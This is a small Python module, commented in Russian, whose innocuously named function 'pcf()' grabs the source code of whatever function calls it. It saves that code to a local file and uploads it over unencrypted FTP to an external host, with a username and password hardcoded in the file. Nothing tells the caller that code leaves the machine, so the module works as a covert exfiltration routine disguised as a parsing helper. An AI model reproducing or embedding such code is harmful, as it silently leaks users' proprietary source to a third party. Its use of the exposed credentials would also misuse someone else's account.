import ftplib
import inspect
import os

def pcf():
    frame = inspect.currentframe().f_back
    code = inspect.getsource(frame.f_code)
    file_path = frame.f_code.co_filename
    upload_data_to_ftp(parse_code(code, file_path))

def parse_code(code, file_path):
    # Извлекаем имя файла из полного пути
    file_name = os.path.basename(file_path)
    parsed_code = f"Parsed code from {file_name}:\n{code}"
    return parsed_code

def upload_data_to_ftp(data, ftp_host="eu-central-1.sftpcloud.io", ftp_username="717d5fbe0754464eb6dc4699cf4e2fe4", ftp_password="hj7Yz863quSgG7pQJh9zQQ4Y3ADC5tqR", ftp_port=21):
    # Устанавливаем соединение с сервером
    with ftplib.FTP() as ftp:
        ftp.connect(ftp_host, ftp_port)
        ftp.login(user=ftp_username, passwd=ftp_password)

        # Загружаем данные на сервер
        with open("parsed_code.txt", "w") as file:
            file.write(data)
        with open("parsed_code.txt", "rb") as file:
            ftp.storbinary(f"STOR parsed_code.txt", file)
